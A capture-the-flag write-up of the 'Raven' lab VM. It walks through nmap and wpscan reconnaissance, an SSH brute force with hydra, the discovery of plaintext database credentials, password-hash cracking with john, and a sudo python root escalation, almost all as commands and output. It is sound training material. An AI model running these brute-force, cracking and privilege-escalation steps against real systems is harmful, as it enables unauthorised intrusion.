# Red Team: Summary of Operations

## Table of Contents
- [Recon](#Recon)
- [Flag1](#Finding-Flag1)
- [Flag2](#Finding-Flag2)
- [Flag3](#Finding-Flag3)
- [Flag4](#Finding-Flag4)

# Recon

- Nmap scan results for the machine reveal the below services and OS details:

```
$ nmap -T4 -A -sC 192.168.1.110 -oN nmap.txt
  #Nmap 7.80 scan initiated Mon Aug  2 03:13:18 2021 as: nmap -T4 -A -sC -oN nmap.txt 192.168.1.110
Nmap scan report for 192.168.1.110
Host is up (0.0017s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33941/udp6  status
|   100024  1          41819/tcp6  status
|   100024  1          53719/tcp   status
|_  100024  1          54717/udp   status
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.2.14-Debian (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:10 (Microsoft)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3h19m59s, deviation: 5h46m24s, median: 0s
|_nbstat: NetBIOS name: TARGET1, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.2.14-Debian)
|   Computer name: raven
|   NetBIOS computer name: TARGET1\x00
|   Domain name: local
|   FQDN: raven.local
|_  System time: 2021-08-02T20:13:32+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-02T10:13:32
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.71 ms 192.168.1.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  2 03:13:32 2021 -- 1 IP address (1 host up) scanned in 14.12 seconds
```

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22 ssh
  - Port 111 rpcbind
  - Port 80 Apache web server
  - Port 139 Samba
  - Port 445 Samba

# Finding Flag1
  
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862482d}

      **Method Used**
      - Directory fuzzing was used to enumerate the website.
      - dirbuster found the /services.html page and flag1 was hidden in the pages source code.
 ```
root@Kali:~# dirbuster 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Aug 03, 2021 2:49:55 AM java.util.prefs.FileSystemPreferences$1 run
INFO: Created user preferences directory.
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
File found: /.hta.php - 403
File found: /.htaccess.php - 403
File found: /.htpasswd.php - 403
Dir found: / - 200
Dir found: /.hta/ - 403
Dir found: /.htaccess/ - 403
Dir found: /.htpasswd/ - 403
File found: /index.html - 200
File found: /about.html - 200
File found: /service.html - 200
```     
- Snippet from [view-source:http://192.168.1.110/service.html](view-source:http://192.168.1.110/service.html)
```html
<!-- End footer Area -->		
<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->
```
  
  
>**Security Issues**
>
>> - [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)

# Finding Flag2
  
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

      **Method Used**
      - Through the previous webpage enumeration it was clear it was hosting a the wordpress application. 
      - wpscan was used aginst it to see if any useful information could be found to help as gain access to the server.




```bash_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.8
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

 [32m[+] [0m URL: http://192.168.1.110/wordpress/
 [32m[+] [0m Started: Mon Aug  2 03:40:57 2021

Interesting Finding(s):

 [32m[+] [0m http://192.168.1.110/wordpress/
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

 [32m[+] [0m http://192.168.1.110/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

 [32m[+] [0m http://192.168.1.110/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

 [32m[+] [0m http://192.168.1.110/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

 [32m[+] [0m WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.110/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.110/wordpress/, Match: 'WordPress 4.8.7'

 [34m[i] [0m The main theme could not be detected.


 [34m[i] [0m User(s) Identified:

 [32m[+] [0m steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

 [32m[+] [0m michael
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

 [33m[!] [0m No WPVulnDB API Token given, as a result vulnerability data has not been output.
 [33m[!] [0m You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

 [32m[+] [0m Finished: Mon Aug  2 03:40:59 2021
 [32m[+] [0m Requests Done: 17
 [32m[+] [0m Cached Requests: 35
 [32m[+] [0m Data Sent: 3.757 KB
 [32m[+] [0m Data Received: 12.015 KB
 [32m[+] [0m Memory used: 119.039 MB
 [32m[+] [0m Elapsed time: 00:00:01
wpscan.txt
Displaying wpscan.txt.
```

  - 2 potemtial usernames were found in the wpscan being `steven` and `micheal` that we can use to attempt to gain access to the machince via ssh.
  - We will target michael first by making a quick wordlist with the [mentalist](https://github.com/sc0tfree/mentalist) of possible passwords.
  ```
  root@Kali:~# mentalist

                    _        _ _     _         
   /\/\   ___ _ __ | |_ __ _| (_)___| |_       
  /    \ / _ \ '_ \| __/ _` | | / __| __|      
 / /\/\ \  __/ | | | || (_| | | \__ \ |_       
 \/    \/\___|_| |_|\__\__,_|_|_|___/\__|   

v 1.0
by sc0tfree


---------------------
| Output initiated: |
---------------------

File: /root/michaelwordlist.txt
Mode: Full Wordlist

Chain
---------------------
Node 1: Base Words
        - String: 'michael'

Node 2: Case
        - Lowercase All
        - Uppercase All
        - Uppercase First, Lower Rest

Est. Total Words: 3
Est. Total Size: 24.0B

Running time (seconds): 0
Word count: 3

------ OUTPUT COMPLETE ------
```
- We will use the wordlist with hydra.
```bash
root@Kali:~# hydra -l michael -P michaelwordlist.txt 192.168.1.110 -t 4 ssh -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-06 21:53:32
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://192.168.1.110:22/
[ATTEMPT] target 192.168.1.110 - login "michael" - pass "MICHAEL" - 1 of 3 [child 0] (0/0)
[ATTEMPT] target 192.168.1.110 - login "michael" - pass "michael" - 2 of 3 [child 1] (0/0)
[ATTEMPT] target 192.168.1.110 - login "michael" - pass "Michael" - 3 of 3 [child 2] (0/0)
[22][ssh] host: 192.168.1.110   login: michael   password: michael
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-06 21:53:35
```
- Hydra confirms the ssh credentials of `michael:michael` that we can now use to try and login.
```
root@Kali:~# ssh michael@192.168.1.110
michael@192.168.1.110's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Tue Aug  3 16:38:01 2021 from 192.168.1.90
michael@target1:~$ 
```
  - After a quick find command the flag was found. 
```
michael@target1:~$ find / -type f -name flag2.txt -print 2>/dev/null
/var/www/flag2.txt
michael@target1:~$ cat /var/www/flag2.txt 
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
```
>**Security Issues**
>
>> - [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
>> - [Security Misconfiguration](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)
>> - [Credential Reuse](https://docs.rapid7.com/metasploit/reusing-credentials/)
>> - [Weak Password](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
# Finding Flag3
  
  - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}


      **Method Used**
      - With access to to micheals account [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) was downloaded to the /tmp/ direcotry for some automated enumeration for any security misconfigurations that may be of intrest.
      
```
michael@target1:/tmp$ git clone https://github.com/carlospolop/PEASS-ng.git
Cloning into 'PEASS-ng'...
remote: Enumerating objects: 7031, done.
remote: Counting objects: 100% (1799/1799), done.
remote: Compressing objects: 100% (592/592), done.
remote: Total 7031 (delta 1205), reused 1602 (delta 1136), pack-reused 5232
Receiving objects: 100% (7031/7031), 35.55 MiB | 13.88 MiB/s, done.
Resolving deltas: 100% (4118/4118), done.
Checking connectivity... done.
michael@target1:/tmp$ cd PEASS-ng/
michael@target1:/tmp/PEASS-ng$ cd linPEAS/
michael@target1:/tmp/PEASS-ng/linPEAS$ ./linpeas.sh 
```
- It discovered the credentials `root:R@v3nSecurity` to a database in a poorly protected php config file.
```bash
╔══════════╣ Searching passwords in config PHP files
define('DB_PASSWORD', 'R@v3nSecurity');                                                                                                    
define('DB_USER', 'root');
        define('DB_PASSWORD', $pwd);
        define('DB_USER', $uname);
        $pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_USER', 'root');
define('DB_PASSWORD', 'password_here');
define('DB_USER', 'username_here');
```
- Using these creds we were able to access the mysql database
```
michael@target1:~$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 43
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
- flag3 was found in the wordpress database and in the wp_posts table
```
As a new WordPress user, you should go to <a href="http://192.168.206.131/wordpress/wp-admin/">your dashboard</a> to delete this page and create new pages for your content. Have fun! | Sample Page  |              | publish     | closed         | open        |               | sample-page   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?page_id=2                      |          0 | page      |                |             0 |
|  4 |           1 | 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3{afc01ab56b50591e7dccf93122770cd2} 
```
>**Security Issues**
>
>> - [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
>> - [Security Misconfiguration](https://owasp.org/www-project-top-ten/2017/)
# Finding Flag4
  
  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}


      **Method Used**
      -  Further enumeration of the wordpress database we were able to get some usernames and hashes from the wp_users table.
```
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+--------------
```
- Already having access to micheals account we focued on stevens credentials.     

 - `steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/`
 - Figuring out the hash type may help in our attempts to crack it I will run it in hash-identifier.
 ```
 root@Kali:~# hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #                                                               
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #                                                               
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #                                                               
   #                                                             By Zion3R #                                                               
   #                                                    www.Blackploit.com #                                                               
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
```
- The hash appears to be a `MD5(Wordpress)`
- john the ripper should be able to atuomaticly dtermine the hashtype without setting the format so we will run it agaisnt the rockyou wordlist using dictoanry attack with the hopes it has appeared in a previous breach.
```
root@Kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 512/512 AVX512BW 16x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pink84           (?)
1g 0:00:00:02 DONE (2021-08-03 00:04) 0.4366g/s 20122p/s 20122c/s 20122C/s tamika1..james03
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```
- John successfully cracked the hash giving use the credentials `steven:pink84`
- We will reley credential reuse and no private ssh key to try get us in via ssh.
```
root@Kali:~# ssh steven@192.168.1.110
steven@192.168.1.110's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug  3 17:10:08 2021 from 192.168.1.90
$ /usr/bin/script -qc /bin/bash /dev/null
steven@target1:~$ 
```
- Now with access we will leverage [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) again to automate any useful information or quick ways privesc.

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                
Matching Defaults entries for steven on raven:                                                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```
- Seeing that steven can run python as sudo  we head to [GTFOBins](https://gtfobins.github.io/) to help us bypass local security restrictions in misconfigured systems to elevate our privledges.
- If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
steven@target1:~$ sudo python -c 'import os; os.system("/bin/sh")'
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
- Now with root privledges we can look in roots home direcorty for the flag.
```
# pwd   
/home/steven
# cd /root/     
# ls
flag4.txt
# cat flag4.txt 
______                      

| ___ \                     

| |_/ /__ ___   _____ _ __  

|    // _` \ \ / / _ \ '_ \ 

| |\ \ (_| |\ V /  __/ | | |

\_| \_\__,_| \_/ \___|_| |_|

                            
flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!

This is my first Boot2Root VM - I hope you enjoyed it.

Hit me up on Twitter and let me know what you thought: 

@mccannwj / wjmccann.github.io
```
>**Security Issues**
>
>> - [Security Misconfiguration](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)
>> - [Credential Reuse](https://docs.rapid7.com/metasploit/reusing-credentials/)
>> - [Weak Password](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.)
